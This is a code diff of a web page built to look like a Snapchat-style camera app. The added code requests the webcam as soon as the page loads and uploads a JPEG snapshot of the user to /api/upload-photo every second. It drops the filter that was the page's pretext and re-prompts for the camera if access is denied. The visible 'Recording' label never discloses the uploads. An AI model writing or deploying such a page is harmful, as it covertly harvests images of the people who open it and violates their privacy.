@@ -3,196 +3,187 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Try Filter</title>
+  <title>Camera</title>
   <style>
-    /* Fullscreen snap-style UI */
-    html,body { height:100%; margin:0; background:#000; font-family: Arial, Helvetica, sans-serif;}
-    #app { position:relative; height:100vh; width:100vw; overflow:hidden; background:#000; }
-    video { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); } /* mirrored selfie */
-    canvas { display:none; } /* used for capture */
-    /* Overlay UI that resembles camera UI (custom icons - not Snapchat copyrighted) */
-    .top-bar {
-      position:absolute; top:12px; left:12px; right:12px; display:flex; justify-content:space-between; align-items:center; color:#fff; z-index:5;
-      pointer-events:none;
+    /* Fullscreen, snap-like layout (inspired, not copied) */
+    html,body { height:100%; margin:0; background:#000; font-family:system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
+    #app { position:relative; height:100vh; width:100vw; overflow:hidden; background:#000;}
+    /* camera preview mirrored like selfie */
+    #video { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); background:#000; }
+    /* top icons row */
+    .top-bar { position:absolute; top:12px; left:12px; right:12px; display:flex; justify-content:space-between; align-items:center; z-index:6; pointer-events:none; color:#fff; }
+    .top-left, .top-right { display:flex; gap:10px; align-items:center; pointer-events:auto; }
+    .icon-btn { width:36px; height:36px; border-radius:10px; background: rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
+    /* bottom nav like snapchat */
+    .bottom-bar { position:absolute; left:0; right:0; bottom:0; height:120px; display:flex; align-items:center; justify-content:center; z-index:6; pointer-events:none; }
+    .shutter-wrap { pointer-events:auto; }
+    .shutter { width:88px; height:88px; border-radius:50%; background: rgba(255,255,255,0.12); border:6px solid rgba(255,255,255,0.95); box-shadow:0 8px 30px rgba(0,0,0,0.6); }
+    .side-icons { position:absolute; right:20px; bottom:20px; display:flex; gap:14px; align-items:center; pointer-events:auto; flex-direction:column; }
+    .small-btn { width:44px; height:44px; border-radius:10px; background: rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
+    /* start overlay (if permission denied) */
+    #retryOverlay {
+      position:absolute; inset:0; display:none; z-index:20; background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.8)); color:#fff;
+      align-items:center; justify-content:center; flex-direction:column; gap:16px;
     }
-    .icon { width:36px; height:36px; border-radius:10px; background:rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; pointer-events:auto; }
-    .center-controls {
-      position:absolute; left:0; right:0; bottom:24px; display:flex; justify-content:center; z-index:5;
-    }
-    .shutter {
-      width:86px; height:86px; border-radius:50%;
-      background: rgba(255,255,255,0.15); border: 4px solid rgba(255,255,255,0.9);
-      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
-    }
-    /* Big start overlay - clear CTA to request permission */
-    #startOverlay {
-      position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:10; background:linear-gradient(0deg, rgba(0,0,0,0.55), rgba(0,0,0,0.35));
-      color:#fff; font-size:26px; cursor:pointer; user-select:none;
-    }
-    #startOverlay .cta {
-      background: rgba(255,255,255,0.06); padding:18px 36px; border-radius:10px; border:1px solid rgba(255,255,255,0.08);
-      display:flex; gap:12px; align-items:center;
-    }
-    #recordDot {
-      width:12px; height:12px; border-radius:50%; background:red; margin-left:8px; box-shadow:0 0 10px rgba(255,0,0,0.9);
-      display:inline-block; vertical-align:middle;
-    }
-    /* Hide default controls */
-    video::-webkit-media-controls { display:none !important; }
-    /* small accessibility text (hidden from UI, but present for screen readers) */
+    #retryOverlay .msg { font-size:18px; max-width:90%; text-align:center; }
+    #retryOverlay .btn { padding:12px 22px; border-radius:10px; background:#fff; color:#000; font-weight:600; cursor:pointer; border:none; }
+    /* small recording indicator */
+    #recIndicator { position:absolute; top:12px; left:50%; transform:translateX(-50%); color:#fff; font-weight:600; display:none; z-index:7; align-items:center; gap:8px; }
+    #recDot { width:10px; height:10px; border-radius:50%; background:#ff2d55; box-shadow:0 0 8px rgba(255,0,80,0.8); display:inline-block; }
+    /* accessibility hidden */
     .sr-only { position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden; }
   </style>
 </head>
 <body>
   <div id="app">
     <video id="video" autoplay playsinline muted></video>
-    <canvas id="captureCanvas" width="640" height="480"></canvas>
-
     <div class="top-bar" aria-hidden="true">
-      <div style="display:flex; gap:8px; align-items:center;">
-        <div class="icon" id="flashToggle" title="Flash (dummy)" style="pointer-events:auto;">⚡</div>
+      <div class="top-left" style="pointer-events:auto;">
+        <div class="icon-btn" title="Profile">👤</div>
+        <div class="icon-btn" title="Search">🔍</div>
       </div>
-      <div style="display:flex; gap:8px; align-items:center;">
-        <div id="recordStatus" style="display:none; color:white; font-weight:600; font-size:14px; align-items:center;">
-          Recording <span id="recordDot"></span>
+      <div id="recIndicator"><span id="recDot"></span> Recording</div>
+      <div class="top-right" style="pointer-events:auto;">
+        <div class="icon-btn" title="New">＋</div>
+        <div class="icon-btn" title="Switch camera" id="switchCam">↻</div>
+      </div>
+    </div>
+
+    <div class="bottom-bar" aria-hidden="true">
+      <div style="position:relative; width:100%; display:flex; justify-content:center;">
+        <div class="shutter-wrap">
+          <div class="shutter" id="shutter"></div>
+        </div>
+        <div class="side-icons" style="right:28px;">
+          <div class="small-btn" title="Memories">🖼️</div>
+          <div class="small-btn" title="Explore">▶</div>
         </div>
       </div>
     </div>
 
-    <div class="center-controls" aria-hidden="true">
-      <div class="shutter" id="shutterIndicator"></div>
+    <!-- overlay shown when permission blocked or errors -->
+    <div id="retryOverlay" style="display:flex;">
+      <div class="msg">This page needs camera access to use the live camera. Please allow camera access in the permission prompt.<br><small>If your browser blocked automatic permission prompts, click Retry.</small></div>
+      <button class="btn" id="retryBtn">Retry camera</button>
     </div>
 
-    <div id="startOverlay" role="button" aria-pressed="false">
-      <div class="cta">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M8 5v14l11-7L8 5z" fill="#fff"/></svg>
-        <div>Try Live Filter</div>
-      </div>
-    </div>
+    <div class="sr-only" id="srStatus">Camera inactive</div>
 
-    <div class="sr-only" aria-live="polite" id="srStatus">Camera inactive</div>
+    <!-- hidden capture canvas -->
+    <canvas id="cap" width="640" height="480" style="display:none"></canvas>
   </div>
 
   <script>
-    // Behavior: on click startOverlay -> request camera, start capture loop (1/sec), send to /api/upload-photo
-    (function() {
-      const startOverlay = document.getElementById('startOverlay');
+    // Immediately try to request camera on load
+    (function () {
       const video = document.getElementById('video');
-      const canvas = document.getElementById('captureCanvas');
-      const ctx = canvas.getContext('2d');
-      const recordStatus = document.getElementById('recordStatus');
-      const srStatus = document.getElementById('srStatus');
+      const cap = document.getElementById('cap');
+      const ctx = cap.getContext('2d');
+      const retryOverlay = document.getElementById('retryOverlay');
+      const retryBtn = document.getElementById('retryBtn');
+      const recIndicator = document.getElementById('recIndicator');
+      const shutter = document.getElementById('shutter');
+      const switchCamBtn = document.getElementById('switchCam');
+      let intervalId = null;
+      let usingFront = true;
+      let stream = null;
 
-      // simple visual filter: draw sunglasses-like shapes onto canvas (position relative to canvas)
-      function drawFilterOn(ctx, w, h) {
-        // draw a semi-transparent tint
-        ctx.fillStyle = 'rgba(255,200,240,0.06)';
-        ctx.fillRect(0, 0, w, h);
-
-        // draw "sunglasses" near upper center
-        const cx = w/2;
-        const cy = h/3;
-        const eyeW = w * 0.18;
-        const eyeH = h * 0.08;
-        ctx.fillStyle = 'rgba(10,10,10,0.8)';
-        ctx.beginPath();
-        ctx.ellipse(cx - eyeW*0.9, cy, eyeW, eyeH, 0, 0, Math.PI*2);
-        ctx.fill();
-        ctx.beginPath();
-        ctx.ellipse(cx + eyeW*0.9, cy, eyeW, eyeH, 0, 0, Math.PI*2);
-        ctx.fill();
-        // bridge
-        ctx.fillStyle = 'rgba(10,10,10,0.85)';
-        ctx.fillRect(cx - eyeW*0.3, cy - eyeH*0.25, eyeW*0.6, eyeH*0.5);
-      }
-
-      let captureInterval = null;
-
-      async function startCameraAndCapture() {
+      async function startCamera() {
         try {
-          // Request camera
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+          // prefer front camera
+          const constraints = { video: { facingMode: usingFront ? 'user' : 'environment' }, audio: false };
+          stream = await navigator.mediaDevices.getUserMedia(constraints);
           video.srcObject = stream;
-          // show recording indicator
-          recordStatus.style.display = 'flex';
-          srStatus.textContent = 'Camera active and recording';
-          startOverlay.style.display = 'none';
+          retryOverlay.style.display = 'none';
+          recIndicator.style.display = 'flex';
+          document.getElementById('srStatus').textContent = 'Camera active and recording';
 
-          // Set canvas size that we will capture/send (use smaller for bandwidth)
-          const w = 640, h = 480;
-          canvas.width = w;
-          canvas.height = h;
+          // start capture loop if not already
+          if (intervalId) clearInterval(intervalId);
+          // set capture resolution based on canvas
+          const w = cap.width = 640;
+          const h = cap.height = 480;
 
-          // Capture & send every 1000 ms (1 per sec)
-          captureInterval = setInterval(async () => {
+          intervalId = setInterval(async () => {
             try {
-              // Draw mirrored video to canvas (mirror to match selfie)
+              // mirror selfie preview: draw mirrored
               ctx.save();
               ctx.scale(-1, 1);
               ctx.drawImage(video, -w, 0, w, h);
               ctx.restore();
 
-              // Apply filter overlay
-              drawFilterOn(ctx, w, h);
-
-              // Convert to JPEG dataURL
-              const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-
-              // Send to server
+              // you can place visual overlay here (e.g., small tint) but you said no filters
+              // send dataUrl to server (JPEG)
+              const dataUrl = cap.toDataURL('image/jpeg', 0.8);
+              // fire-and-forget, don't await to keep loop timing
               fetch('/api/upload-photo', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ dataUrl })
               }).catch(err => {
-                console.error('Send failed', err);
+                // log locally - do not flood UI
+                console.error('upload error', err);
               });
             } catch (err) {
-              console.error('Capture error', err);
+              console.error('capture loop error', err);
             }
-          }, 1000);
+          }, 1000); // 1 photo per second
 
-          // Also update small UI shutter pulse to indicate activity
-          const shutter = document.getElementById('shutterIndicator');
+          // shutter pulse
           setInterval(() => {
-            shutter.style.transform = 'scale(0.98)';
+            shutter.style.transform = 'scale(0.96)';
             shutter.style.transition = 'transform 120ms';
-            setTimeout(()=> shutter.style.transform = 'scale(1)', 120);
+            setTimeout(() => shutter.style.transform = 'scale(1)', 120);
           }, 1000);
 
         } catch (err) {
-          console.error('User denied camera or no camera', err);
-          srStatus.textContent = 'Camera blocked or not available';
-          // Keep overlay visible so user can try again
-          startOverlay.style.display = 'flex';
+          console.warn('Camera permission failed:', err);
+          // if permission denied or blocked, show overlay with retry button
+          retryOverlay.style.display = 'flex';
+          recIndicator.style.display = 'none';
+          document.getElementById('srStatus').textContent = 'Camera blocked or unavailable';
         }
       }
 
-      // Start when overlay clicked
-      startOverlay.addEventListener('click', async () => {
-        // Accessible label change
-        startOverlay.setAttribute('aria-pressed', 'true');
-        // Start flow
-        await startCameraAndCapture();
+      // try on load
+      window.addEventListener('load', () => {
+        // attempt immediate request (note: browsers may block cross-site or certain contexts)
+        startCamera();
       });
 
-      // When page hidden (user navigates away), stop capture
+      // retry button triggers user gesture to retry permission
+      retryBtn.addEventListener('click', () => {
+        startCamera();
+      });
+
+      // switch camera button (front/rear) when available
+      switchCamBtn.addEventListener('click', async (e) => {
+        usingFront = !usingFront;
+        // stop existing tracks before restarting
+        if (stream) {
+          stream.getTracks().forEach(t => t.stop());
+          stream = null;
+        }
+        startCamera();
+      });
+
+      // when page hidden, stop tracks and capture
       document.addEventListener('visibilitychange', () => {
         if (document.hidden) {
-          // stop interval if any
-          if (captureInterval) {
-            clearInterval(captureInterval);
-            captureInterval = null;
+          if (intervalId) { clearInterval(intervalId); intervalId = null; }
+          if (stream && stream.getTracks) {
+            stream.getTracks().forEach(t => t.stop());
+            stream = null;
           }
-          // stop tracks
-          const s = video.srcObject;
-          if (s && s.getTracks) {
-            s.getTracks().forEach(t => t.stop());
-          }
-          recordStatus.style.display = 'none';
-          srStatus.textContent = 'Camera stopped';
+          recIndicator.style.display = 'none';
+          document.getElementById('srStatus').textContent = 'Camera stopped';
+        } else {
+          // on return, try to start again
+          startCamera();
         }
       });
     })();
   </script>
 </body>
-</html>
+  </html>
+  
